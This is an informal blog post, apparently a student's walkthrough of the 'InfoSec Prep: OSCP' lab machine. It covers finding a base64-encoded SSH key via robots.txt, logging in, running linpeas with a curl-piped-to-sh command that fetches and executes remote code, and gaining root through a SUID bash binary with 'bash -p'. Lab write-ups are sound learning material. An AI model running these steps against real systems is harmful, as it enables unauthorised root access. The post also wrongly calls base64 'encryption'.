---
layout: post
title: writeup
tags: cyber-security
category: school
date: 02-10-2022
---

# InfoSec Prep: OSCP
![](/blog/1.png)
## first of all we need to innumerate the machine
here we r going to use the nmap scan
![](/blog/nmap_first.png)
we we found that there is an open port with ssh
## now we r going to see some basic things
lets take a look at /robots.txt
boom we found that there is a hidden file called secret
![](/blog/2.png)
![](/blog/3.png)
its obvious that its a base 64 encryption
so we r going to encrypt it
![](/blog/4.png)
it contains an ssh private key
now we have the ssh private key so we need its user to connect with the machine using ssh
on the main page of the website we find that someone mentioned the user "oscp"
![](/blog/5.png)
## now we will try to connect the machine
![](/blog/6.png)
![](/blog/dkhlna.png)
ouah! we'r in
we are not root so we have to try to be root
I'm going to run my favorite script written by my dear friend MZA7A to find all vulnerabilities
and sus files
```curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh```

I have tried to exploit those vulnerabilities but i didn't get anything so
let's take a look at the sus files 
![](/blog/susfile.png)
we see that file in /usr/bin/ called "bash" with its yellow color and we see that bash has some interesting permissions set
the file is called bash so lets open the bash man and try to understand well
![](/blog/-p.png)
this "-p" could help us
### SUID
Set owner User ID
it runs with the suid bit set and may be exploited to access the file system or maintain access with elevated privileges working as a suid  backdoor if it's used to run ```sh -p``` omit the ```-p``` arguments on systems like Debian that allows the default ```sh``` to run with SUID privileges
## lets run this command ```/usr/bin/bash -p```
![](/blog/done.png)
we are root now and we got the flag
